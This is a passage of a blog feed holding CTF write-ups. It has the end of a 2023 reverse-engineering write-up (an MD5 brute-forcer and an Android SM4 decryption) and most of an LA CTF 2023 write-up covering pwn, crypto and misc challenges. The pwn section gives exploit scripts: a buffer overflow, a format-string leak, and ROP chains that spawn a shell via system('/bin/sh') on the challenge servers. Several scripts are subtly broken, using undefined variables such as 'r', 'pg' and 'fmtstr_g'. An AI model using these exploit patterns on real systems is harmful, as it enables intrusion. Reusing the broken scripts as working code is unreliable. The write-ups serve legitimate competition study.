class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;md5.c&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> status;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> selemtype;<br><span class="hljs-type">char</span> choices[][<span class="hljs-number">10</span>] = &#123;<br>    <span class="hljs-string">&quot;cat&quot;</span>,<br>    <span class="hljs-string">&quot;dog&quot;</span>,<br>    <span class="hljs-string">&quot;fox&quot;</span>,<br>    <span class="hljs-string">&quot;panda&quot;</span>,<br>    <span class="hljs-string">&quot;dragon&quot;</span>,<br>    <span class="hljs-string">&quot;monkey&quot;</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> answer[] = &#123;<br>    <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x85</span>,<br>    <span class="hljs-number">0x46</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x18</span><br>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span> </span>&#123;<br>    MD5_CTX md5;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> md5_str[<span class="hljs-number">32</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> length = <span class="hljs-number">9</span>;  <br><br>    <span class="hljs-type">int</span> choice[length]; <br><br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>        choice[i] = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">char</span> animalName[length * <span class="hljs-number">10</span> + <span class="hljs-number">1</span>];  <br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            <span class="hljs-type">int</span> choiceIndex = choice[i];<br>            <span class="hljs-type">char</span> *animal = choices[choiceIndex];<br>            <span class="hljs-keyword">while</span> (*animal != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br>                animalName[index] = *animal;<br>                animal++;<br>                index++;<br>            &#125;<br>        &#125;<br>        animalName[index] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">16</span> ; i ++ )<br>        &#123;<br>            md5_str[i]=<span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-built_in">MD5Init</span>(&amp;md5);<br>        <span class="hljs-built_in">MD5Update</span>(&amp;md5, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)animalName, <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)animalName));<br>        <span class="hljs-built_in">MD5Final</span>(&amp;md5, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)md5_str);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">16</span> ; i ++ ) &#123;<br>            md5_str[i] = (md5_str[i] &amp; <span class="hljs-number">0xE9</span> | ~md5_str[i] &amp; <span class="hljs-number">0x16</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">16</span> ; i ++ )<br>        &#123;<br>            <span class="hljs-keyword">if</span>(md5_str[i]!=answer[i])<br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">5</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,animalName);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>            <br>        <br>        <span class="hljs-type">int</span> i = length - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span> &amp;&amp; choice[i] == <span class="hljs-number">5</span>) &#123;<br>            choice[i] = <span class="hljs-number">0</span>;<br>            i--;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        choice[i]++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">//catmonkeydogdragondogcatfoxpandapanda</span><br><span class="hljs-comment">//051410233</span><br></code></pre></td></tr></table></figure><p>找出相应序号然后md5加密套上flag{}即可<br><code>flag&#123;839c998c52db6618bb24c346b85a894f&#125;</code></p><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>用jadx分析无果，解压去分析so层文件，在<code>libjniex.so</code>发现<code>decrypt</code>函数<br><img src="/mdimg/2023hwsummer/9.png"><br>跟进去发现为SM4密码，并发现密文。<br><img src="/mdimg/2023hwsummer/10.png"><br>装不了模拟器，手机安装运行APK文件即可看到key:<code>159762dr7vh438sa</code>iv:<code>1313131313131313</code><br><img src="/mdimg/2023hwsummer/11.jpeg"><br><img src="/mdimg/2023hwsummer/12.jpeg"><br>赛博厨子直接SM4解密就可以。<br><img src="/mdimg/2023hwsummer/13.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LA CTF 2023</title>
    <link href="/2023/02/14/LACTF2023/"/>
    <url>/2023/02/14/LACTF2023/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/LACTF2023/lactf.gif"></p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="1-gatekeep"><a href="#1-gatekeep" class="headerlink" title="1. gatekeep"></a>1. gatekeep</h4><p>There is an overflow in the gets() function, so if the input is greater than char s1[15], the check() function can be bypassed and the flag can be obtained.</p><p><img src="/mdimg/LACTF2023/6.png"></p><h4 id="2-bot"><a href="#2-bot" class="headerlink" title="2. bot"></a>2. bot</h4><p><code>gets()</code> has an overflow, and <code>strcmp()</code> has a bug where it stops reading input after a NULL byte. So the question asks you to take the input, then compare it to some string before returning it. All you have to do is write a NULL byte-terminated string, and the write buffer overflows.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31180</span>)<br>p.recv()<br>g = <span class="hljs-string">b&quot;may i have the flag?\0&quot;</span><br>g += <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">64</span>-<span class="hljs-built_in">len</span>(g))<br>g += <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>g += p64(<span class="hljs-number">0x40129a</span>)<br>p.sendline(g)<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="3-rut-roh-relro"><a href="#3-rut-roh-relro" class="headerlink" title="3.rut-roh-relro"></a>3.<strong>rut-roh-relro</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31134</span>)<br>elf = ELF(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *$rebase(0x11C6)</span><br><span class="hljs-string">b *$rebase(0x1201)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&quot;%71$p %72$p&quot;</span><br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,g)<br><br>p.recvuntil(<span class="hljs-string">&quot;Here&#x27;s your latest post:\n&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot; &quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">234</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>stack_addr = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ret_stack = stack_addr - <span class="hljs-number">0xf0</span><br>success(<span class="hljs-string">&quot;ret_stack = &quot;</span>+<span class="hljs-built_in">hex</span>(ret_stack))<br><br>start_stack = stack_addr - <span class="hljs-number">0xf0</span> - <span class="hljs-number">0x20</span><br><br>gadget = <span class="hljs-number">0xc967a</span><br>one_gadget = libc_base+gadget<br><br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023796</span><br><br>g = fmtstr_g(<span class="hljs-number">6</span>, &#123;ret_stack:pop_rdi_ret,ret_stack+<span class="hljs-number">8</span>:bin_sh,ret_stack+<span class="hljs-number">0x10</span>:system_addr&#125;, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,pg)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="4-redact"><a href="#4-redact" class="headerlink" title="4.redact"></a>4.redact</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./redact&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31181</span>)<br>elf = ELF(<span class="hljs-string">&quot;./redact&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *0x40149a</span><br><span class="hljs-string">b *0x4012F9</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pop_rdi_ret = <span class="hljs-number">0x000000000040177b</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x0000000000401779</span><br>start_addr = <span class="hljs-number">0x401120</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&#x27;a&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter some text: &quot;</span>,g)<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(<span class="hljs-number">0x4040C0</span>)+p64(pop_rsi_r15_ret)+p64(<span class="hljs-number">0x403FE8</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4010C0</span>)+p64(start_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br><br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>libc_base = u64(r.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base+libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="1-one-more-time-pad"><a href="#1-one-more-time-pad" class="headerlink" title="1. one-more-time-pad"></a>1. one-more-time-pad</h4><p>Just XOR.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br>pt = <span class="hljs-string">b&quot;Long ago, the four nations lived together in harmony ...&quot;</span><br>ct = <span class="hljs-number">0x200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e</span><br>ct=long_to_bytes(<span class="hljs-built_in">int</span>(ct))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ct)):<br>    flag = (pt[i] ^ ct[i])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#lactf&#123;b4by_h1t_m3_0ne_m0r3_t1m3&#125;</span><br></code></pre></td></tr></table></figure><h4 id="2-chinese-lazy-theorem-1"><a href="#2-chinese-lazy-theorem-1" class="headerlink" title="2. chinese-lazy-theorem-1"></a>2. chinese-lazy-theorem-1</h4><p>Make the modulus greater than the maximum value of the target, which is p*q, to leak the target, and then get the flag according to the target.<br><img src="/mdimg/LACTF2023/1.png"></p><h4 id="3-rolling-in-the-mud"><a href="#3-rolling-in-the-mud" class="headerlink" title="3. rolling in the mud"></a>3. rolling in the mud</h4><p><img src="/mdimg/LACTF2023/2.png"><br>Solve the pigsty password.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;eombmcvcalebupauntcnjppmjfnicnappmjfnippmjfni&#125;</span><span class="language-xml">dugip</span><br></code></pre></td></tr></table></figure><p>After the reverse order, use quip to blast.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">lactf</span><span class="hljs-template-variable">&#123;rolling_and_rolling_and_rolling_until_the_pigs_go_home&#125;</span><br></code></pre></td></tr></table></figure><h4 id="4-greek-cipher"><a href="#4-greek-cipher" class="headerlink" title="4. greek cipher"></a>4. greek cipher</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe">κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ζπι ιηγ δςρθι ψγρθπζ ςζ ηςθιπρω θνθψγμιγκ πδ νθςζε γζμρωψιςπζ? τγ ζγςιηγρ. κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ψρπξσξοω δονγζι ςζ εργγα? τγ ζγςιηγρ. ς οςαγ ηπλ εργγα μησρσμιγρ οππα ιηπνεη, γυγζ ςδ ς μσζ<span class="hljs-string">&#x27;ι ργσκ ιηγτ. οσμιδ&#123;ς_ενγθθ_νθςζε_τσζω_εργγα_μησρσμιγρθ_κςκζ&#x27;</span>ι<span class="hljs-literal">_</span>θιπψ<span class="hljs-literal">_</span>ωπν<span class="hljs-number">._</span>λγοο<span class="hljs-literal">_</span>ψοσωγκ<span class="hljs-literal">_</span>ς<span class="hljs-literal">_</span>τνθι<span class="hljs-literal">_</span>θσω.μπζερσιθ!&#125;<br>print(<span class="hljs-string">&#x27;&#x27;</span>.join(sorted(<span class="hljs-keyword">set</span>(input()))))<br></code></pre></td></tr></table></figure><p>This code implements the de-reordering function of a string. It takes user input as a string, converts it to a set, and removes duplicate characters. Then, it sorts the collection, and converts it back to a string. Finally, the code prints out the result using the “print” function.<br>and then with the help of a tool site<a href="https://tio.run/#">https://tio.run/#</a><br><img src="/mdimg/LACTF2023/3.png"><br>Then use Cyberchef’s Substitute.<br><img src="/mdimg/LACTF2023/4.png"><br>Finally, quipqiup can be blasted.</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">lactf&#123;i_guess_using_many_greek_characters_didn<span class="hljs-symbol">&#x27;t_stop_you._well_played_i_must_say.congrats</span>!&#125;<br></code></pre></td></tr></table></figure><h4 id="5-guess-the-bit"><a href="#5-guess-the-bit" class="headerlink" title="5. guess-the-bit!"></a>5. guess-the-bit!</h4><p>Carefully observe the encryption source code logic, 150 cycles are performed, and each cycle generates a random number c, which is either the square of the original number, or the product of the square of the original number and 6. So you need to guess whether the number is a square or a multiple of 6.</p><p><img src="/mdimg/LACTF2023/5.png"><br>As shown in the figure above, if both conditions are true, return “1” to the server, otherwise return “0”. Write a script with the help of pwntools.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.primetest <span class="hljs-keyword">import</span> is_square <br><br>p = remote(<span class="hljs-string">&#x27;lac.tf&#x27;</span>, <span class="hljs-number">31190</span>)<br>p.recvline()<br>p.recvline()<br><br>C = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> C != <span class="hljs-number">150</span>:<br>    c = <span class="hljs-built_in">int</span>((p.recvline().decode()).split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">if</span> c%<span class="hljs-number">6</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> is_square(c//<span class="hljs-number">6</span>):<br>        p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p.sendline(<span class="hljs-string">b&quot;0&quot;</span>)<br>    C += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(C,end=<span class="hljs-string">&quot;\r&quot;</span>)<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><br><span class="hljs-comment"># lactf&#123;sm4ll_pla1nt3xt_sp4ac3s_ar3n&#x27;t_al4ways_e4sy&#125;</span><br></code></pre></td></tr></table></figure><h4 id="6-chinese-lazy-theorem-2"><a href="#6-chinese-lazy-theorem-2" class="headerlink" title="6. chinese-lazy-theorem-2"></a>6. chinese-lazy-theorem-2</h4><p>According to the chinese lazy theorem, if you find <code>target % p</code> and <code>target % q</code>, you can find <code>target % pq</code>, but knowing <code>target % pq</code> is not enough, because the maximum target is <code>p*q*2*3 *5</code>, so try 30 times <code>(target % pq) + i * pq</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><br><span class="hljs-keyword">with</span> remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31111</span>) <span class="hljs-keyword">as</span> r:<br>    p = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    q = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(p).encode())<br>    x = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(q).encode())<br>    y = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    a, b = crt([p,q],[x,y])<br>    r.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>        r.readuntil(<span class="hljs-string">b&quot;Type your guess here: &quot;</span>)<br>        r.sendline(<span class="hljs-built_in">str</span>(a+i*b).encode())<br>        <span class="hljs-built_in">print</span>(r.readline())<br></code></pre></td></tr></table></figure><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="1-ECB"><a href="#1-ECB" class="headerlink" title="1. ECB"></a>1. ECB</h4><p>UDP traffic analysis, using RFC 3514，<a href="https://www.ietf.org/rfc/rfc3514.txt">https://www.ietf.org/rfc/rfc3514.txt</a><br><img src="/mdimg/LACTF2023/7.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 